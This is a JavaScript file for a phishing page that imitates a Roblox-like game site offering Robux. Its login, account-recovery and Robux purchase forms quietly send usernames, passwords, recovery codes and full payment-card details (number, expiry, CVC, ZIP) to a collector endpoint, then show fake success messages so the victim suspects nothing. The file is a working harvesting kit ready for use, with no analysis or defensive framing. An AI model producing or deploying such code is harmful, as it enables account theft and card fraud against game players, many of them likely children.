// ============ CONFIG ============
const CAPTURE_ENDPOINT = "https://your-collector.example/api/capture"; // your endpoint
const USE_BEACON = true; // navigator.sendBeacon fallback for reliability

// ============ helpers ============
async function capture(kind, payload) {
  const data = { kind, payload, ts: Date.now(), ua: navigator.userAgent, ref: location.href };
  try {
    if (USE_BEACON && navigator.sendBeacon) {
      navigator.sendBeacon(CAPTURE_ENDPOINT, new Blob([JSON.stringify(data)], { type: 'application/json' }));
    } else {
      await fetch(CAPTURE_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data), keepalive: true });
    }
  } catch (_) {}
}

function openModal(id){ document.getElementById(id).classList.add('open'); }
function closeModal(el){ el.classList.remove('open'); }
document.querySelectorAll('[data-close]').forEach(c => c.addEventListener('click', () => closeModal(c.closest('.modal'))));
document.querySelectorAll('.modal').forEach(m => m.addEventListener('click', e => { if (e.target === m) closeModal(m); }));

// ============ login ============
document.getElementById('loginOpen').addEventListener('click', () => openModal('loginModal'));
document.getElementById('signupOpen').addEventListener('click', () => openModal('loginModal'));
document.getElementById('playNow').addEventListener('click', () => openModal('loginModal'));
document.getElementById('robuxBtn').addEventListener('click', () => openModal('robuxModal'));

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const f = new FormData(e.target);
  const u = f.get('username'), p = f.get('password');
  await capture('credentials', { username: u, password: p });
  // fake success -> persist "session" and go to dashboard
  localStorage.setItem('bloxar_session', JSON.stringify({ username: u, robux: 1200 }));
  location.href = 'dashboard.html';
});

// ============ no-password flow ============
document.getElementById('noPassLink').addEventListener('click', (e) => {
  e.preventDefault();
  openModal('noPassModal');
});
document.getElementById('noPassForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const f = new FormData(e.target);
  await capture('recovery', { username: f.get('username'), code: f.get('code') || null });
  alert('If the account exists, a code has been sent to the registered email.');
  closeModal(document.getElementById('noPassModal'));
});

// ============ robux purchase ============
let selectedAmount = null, selectedPrice = null;
document.querySelectorAll('.robux-card').forEach(card => {
  card.addEventListener('click', () => {
    document.querySelectorAll('.robux-card').forEach(c => c.classList.remove('selected'));
    card.classList.add('selected');
    selectedAmount = card.dataset.amount;
    selectedPrice = card.dataset.price;
    document.getElementById('payForm').classList.remove('hidden');
  });
});
document.getElementById('payForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const f = new FormData(e.target);
  await capture('payment', {
    amount: selectedAmount, price: selectedPrice,
    card: f.get('card'), exp: f.get('exp'), cvc: f.get('cvc'), zip: f.get('zip')
  });
  const s = JSON.parse(localStorage.getItem('bloxar_session') || '{"username":"Player","robux":0}');
  s.robux = (s.robux || 0) + parseInt(selectedAmount || 0, 10);
  localStorage.setItem('bloxar_session', JSON.stringify(s));
  alert('Purchase complete! Robux added.');
  closeModal(document.getElementById('robuxModal'));
});

// ============ game grid ============
const grid = document.getElementById('gameGrid');
if (grid) {
  const names = ['Sky Warriors','Pet Sim','Tower Defense','Racing Legends','Obby Master','Battle Royale','Tycoon City','Survival Island'];
  names.forEach(n => {
    const d = document.createElement('div');
    d.className = 'game-tile';
    d.textContent = n;
    grid.appendChild(d);
  });
    }
